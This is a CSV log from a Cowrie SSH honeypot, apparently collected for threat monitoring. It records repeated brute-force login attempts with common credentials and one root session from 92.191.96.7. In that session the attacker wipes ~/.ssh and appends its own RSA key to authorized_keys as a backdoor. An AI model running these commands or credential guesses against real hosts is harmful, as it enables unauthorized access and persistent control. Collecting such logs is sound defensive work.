eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,154.216.19.22,,,,1089e69838c3,,,98f63c4d9c87edbd97ed4747fa031019,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019,localhost,2024-11-29T00:08:48.100557Z
cowrie.login.failed,154.216.19.22,,,,1089e69838c3,,,,,login attempt [gefang/gefang] failed,localhost,2024-11-29T00:08:48.602111Z
cowrie.session.closed,154.216.19.22,,,,1089e69838c3,,,,,Connection lost after 1 seconds,localhost,2024-11-29T00:08:49.770527Z
cowrie.session.connect,104.248.135.9,54240,172.233.154.19,2222,501a5ee47310,ssh,,,,New connection: 104.248.135.9:54240 (172.233.154.19:2222) [session: 501a5ee47310],localhost,2024-11-29T00:09:17.095772Z
cowrie.client.version,104.248.135.9,,,,501a5ee47310,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:09:17.096575Z
cowrie.client.kex,104.248.135.9,,,,501a5ee47310,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:09:17.249801Z
cowrie.login.failed,104.248.135.9,,,,501a5ee47310,,,,,login attempt [tta/123456] failed,localhost,2024-11-29T00:09:17.904417Z
cowrie.session.connect,103.187.146.207,34614,172.233.154.19,2222,0defcc6047b9,ssh,,,,New connection: 103.187.146.207:34614 (172.233.154.19:2222) [session: 0defcc6047b9],localhost,2024-11-29T00:09:18.845370Z
cowrie.client.version,103.187.146.207,,,,0defcc6047b9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:09:18.846564Z
cowrie.client.kex,103.187.146.207,,,,0defcc6047b9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:09:19.024025Z
cowrie.session.closed,104.248.135.9,,,,501a5ee47310,,,,,Connection lost after 1 seconds,localhost,2024-11-29T00:09:19.058395Z
cowrie.login.failed,103.187.146.207,,,,0defcc6047b9,,,,,login attempt [hos/123] failed,localhost,2024-11-29T00:09:19.899264Z
cowrie.session.closed,103.187.146.207,,,,0defcc6047b9,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:09:21.078019Z
cowrie.session.connect,92.191.96.7,41406,172.233.154.19,2222,35c103d4bc9f,ssh,,,,New connection: 92.191.96.7:41406 (172.233.154.19:2222) [session: 35c103d4bc9f],localhost,2024-11-29T00:09:43.719490Z
cowrie.client.version,92.191.96.7,,,,35c103d4bc9f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:09:43.720141Z
cowrie.client.kex,92.191.96.7,,,,35c103d4bc9f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:09:43.902538Z
cowrie.login.failed,92.191.96.7,,,,35c103d4bc9f,,,,,login attempt [alok/alok@123] failed,localhost,2024-11-29T00:09:44.621393Z
cowrie.session.closed,92.191.96.7,,,,35c103d4bc9f,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:09:45.794046Z
cowrie.session.connect,197.5.145.8,13990,172.233.154.19,2222,180e15d64b68,ssh,,,,New connection: 197.5.145.8:13990 (172.233.154.19:2222) [session: 180e15d64b68],localhost,2024-11-29T00:09:54.480667Z
cowrie.client.version,197.5.145.8,,,,180e15d64b68,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:09:54.489401Z
cowrie.client.kex,197.5.145.8,,,,180e15d64b68,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:09:54.657632Z
cowrie.login.failed,197.5.145.8,,,,180e15d64b68,,,,,login attempt [lighthouse/qwerty123] failed,localhost,2024-11-29T00:09:55.334135Z
cowrie.session.closed,197.5.145.8,,,,180e15d64b68,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:09:56.509372Z
cowrie.session.connect,104.248.135.9,49270,172.233.154.19,2222,f411da88f07c,ssh,,,,New connection: 104.248.135.9:49270 (172.233.154.19:2222) [session: f411da88f07c],localhost,2024-11-29T00:10:32.706133Z
cowrie.client.version,104.248.135.9,,,,f411da88f07c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:10:32.706919Z
cowrie.client.kex,104.248.135.9,,,,f411da88f07c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:10:32.851770Z
cowrie.login.failed,104.248.135.9,,,,f411da88f07c,,,,,login attempt [hz/123456] failed,localhost,2024-11-29T00:10:33.471162Z
cowrie.session.closed,104.248.135.9,,,,f411da88f07c,,,,,Connection lost after 1 seconds,localhost,2024-11-29T00:10:34.617580Z
cowrie.session.connect,103.187.146.207,43108,172.233.154.19,2222,743c1be9a843,ssh,,,,New connection: 103.187.146.207:43108 (172.233.154.19:2222) [session: 743c1be9a843],localhost,2024-11-29T00:10:59.788362Z
cowrie.client.version,103.187.146.207,,,,743c1be9a843,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:10:59.789022Z
cowrie.client.kex,103.187.146.207,,,,743c1be9a843,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:10:59.974837Z
cowrie.login.failed,103.187.146.207,,,,743c1be9a843,,,,,login attempt [mpd/mpd] failed,localhost,2024-11-29T00:11:01.047158Z
cowrie.session.closed,103.187.146.207,,,,743c1be9a843,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:11:02.235421Z
cowrie.session.connect,92.191.96.7,58254,172.233.154.19,2222,2a5a4db0d892,ssh,,,,New connection: 92.191.96.7:58254 (172.233.154.19:2222) [session: 2a5a4db0d892],localhost,2024-11-29T00:11:02.270032Z
cowrie.client.version,92.191.96.7,,,,2a5a4db0d892,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:11:02.270478Z
cowrie.client.kex,92.191.96.7,,,,2a5a4db0d892,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:11:02.433955Z
cowrie.login.failed,92.191.96.7,,,,2a5a4db0d892,,,,,login attempt [slurm/1234] failed,localhost,2024-11-29T00:11:03.119852Z
cowrie.session.closed,92.191.96.7,,,,2a5a4db0d892,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:11:04.281439Z
cowrie.session.connect,197.5.145.8,13991,172.233.154.19,2222,9d512bf20a16,ssh,,,,New connection: 197.5.145.8:13991 (172.233.154.19:2222) [session: 9d512bf20a16],localhost,2024-11-29T00:11:16.441975Z
cowrie.client.version,197.5.145.8,,,,9d512bf20a16,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:11:16.450399Z
cowrie.client.kex,197.5.145.8,,,,9d512bf20a16,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:11:16.615625Z
cowrie.login.failed,197.5.145.8,,,,9d512bf20a16,,,,,login attempt [liuxin/123456] failed,localhost,2024-11-29T00:11:17.288255Z
cowrie.session.closed,197.5.145.8,,,,9d512bf20a16,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:11:18.458727Z
cowrie.session.connect,104.248.135.9,59798,172.233.154.19,2222,2bb7180eef9f,ssh,,,,New connection: 104.248.135.9:59798 (172.233.154.19:2222) [session: 2bb7180eef9f],localhost,2024-11-29T00:11:45.863307Z
cowrie.client.version,104.248.135.9,,,,2bb7180eef9f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:11:45.865485Z
cowrie.client.kex,104.248.135.9,,,,2bb7180eef9f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:11:46.009416Z
cowrie.login.failed,104.248.135.9,,,,2bb7180eef9f,,,,,login attempt [sebastiano/sebastiano] failed,localhost,2024-11-29T00:11:46.589476Z
cowrie.session.closed,104.248.135.9,,,,2bb7180eef9f,,,,,Connection lost after 1 seconds,localhost,2024-11-29T00:11:47.736240Z
cowrie.session.connect,139.199.80.137,42724,172.233.154.19,2222,d42b15abf251,ssh,,,,New connection: 139.199.80.137:42724 (172.233.154.19:2222) [session: d42b15abf251],localhost,2024-11-29T00:12:01.731564Z
cowrie.client.version,139.199.80.137,,,,d42b15abf251,,SSH-2.0-libssh-0.2,,,Remote SSH version: SSH-2.0-libssh-0.2,localhost,2024-11-29T00:12:01.886070Z
cowrie.session.closed,139.199.80.137,,,,d42b15abf251,,,,,Connection lost after 0 seconds,localhost,2024-11-29T00:12:02.040499Z
cowrie.session.connect,92.191.96.7,44324,172.233.154.19,2222,ba95f938f87c,ssh,,,,New connection: 92.191.96.7:44324 (172.233.154.19:2222) [session: ba95f938f87c],localhost,2024-11-29T00:12:16.695994Z
cowrie.client.version,92.191.96.7,,,,ba95f938f87c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:12:16.696816Z
cowrie.client.kex,92.191.96.7,,,,ba95f938f87c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:12:16.871628Z
cowrie.login.success,92.191.96.7,,,,ba95f938f87c,,,,,login attempt [root/123456aA@] succeeded,localhost,2024-11-29T00:12:17.549539Z
cowrie.session.params,92.191.96.7,,,,ba95f938f87c,,,,,[],localhost,2024-11-29T00:12:17.909014Z
cowrie.command.input,92.191.96.7,,,,ba95f938f87c,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T00:12:17.909574Z
cowrie.command.failed,92.191.96.7,,,,ba95f938f87c,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T00:12:17.910292Z
cowrie.log.closed,92.191.96.7,,,,ba95f938f87c,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T00:12:18.288443Z
cowrie.session.params,92.191.96.7,,,,ba95f938f87c,,,,,[],localhost,2024-11-29T00:12:18.479011Z
cowrie.command.input,92.191.96.7,,,,ba95f938f87c,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T00:12:18.479569Z
cowrie.session.file_download,92.191.96.7,,,,ba95f938f87c,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T00:12:18.650393Z
cowrie.log.closed,92.191.96.7,,,,ba95f938f87c,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T00:12:18.650946Z
cowrie.session.connect,92.191.96.7,44330,172.233.154.19,2222,a20c20c3f8ce,ssh,,,,New connection: 92.191.96.7:44330 (172.233.154.19:2222) [session: a20c20c3f8ce],localhost,2024-11-29T00:12:18.817199Z
cowrie.client.version,92.191.96.7,,,,a20c20c3f8ce,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:12:18.817727Z
cowrie.client.kex,92.191.96.7,,,,a20c20c3f8ce,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:12:18.989600Z
cowrie.login.failed,92.191.96.7,,,,a20c20c3f8ce,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T00:12:19.706528Z
cowrie.session.closed,92.191.96.7,,,,a20c20c3f8ce,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:12:20.876503Z
cowrie.session.connect,92.191.96.7,44346,172.233.154.19,2222,78d4b3aeb7d2,ssh,,,,New connection: 92.191.96.7:44346 (172.233.154.19:2222) [session: 78d4b3aeb7d2],localhost,2024-11-29T00:12:21.048952Z
cowrie.client.version,92.191.96.7,,,,78d4b3aeb7d2,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:12:21.049507Z
cowrie.client.kex,92.191.96.7,,,,78d4b3aeb7d2,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:12:21.354537Z
cowrie.login.success,92.191.96.7,,,,78d4b3aeb7d2,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T00:12:22.071178Z
cowrie.session.closed,92.191.96.7,,,,78d4b3aeb7d2,,,,,Connection lost after 1 seconds,localhost,2024-11-29T00:12:22.239785Z
cowrie.session.closed,92.191.96.7,,,,ba95f938f87c,,,,,Connection lost after 5 seconds,localhost,2024-11-29T00:12:22.242096Z
cowrie.session.connect,103.187.146.207,44586,172.233.154.19,2222,b2d8cb154883,ssh,,,,New connection: 103.187.146.207:44586 (172.233.154.19:2222) [session: b2d8cb154883],localhost,2024-11-29T00:12:32.537188Z
cowrie.client.version,103.187.146.207,,,,b2d8cb154883,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:12:32.537831Z
cowrie.client.kex,103.187.146.207,,,,b2d8cb154883,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:12:32.718815Z
cowrie.login.failed,103.187.146.207,,,,b2d8cb154883,,,,,login attempt [ismael/123456] failed,localhost,2024-11-29T00:12:33.849740Z
cowrie.session.closed,103.187.146.207,,,,b2d8cb154883,,,,,Connection lost after 2 seconds,localhost,2024-11-29T00:12:35.032895Z
cowrie.session.connect,197.5.145.8,13992,172.233.154.19,2222,9b381e9c3e7f,ssh,,,,New connection: 197.5.145.8:13992 (172.233.154.19:2222) [session: 9b381e9c3e7f],localhost,2024-11-29T00:12:36.026466Z
cowrie.client.version,197.5.145.8,,,,9b381e9c3e7f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T00:12:36.027091Z
cowrie.client.kex,197.5.145.8,,,,9b381e9c3e7f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T00:12:36.205889Z
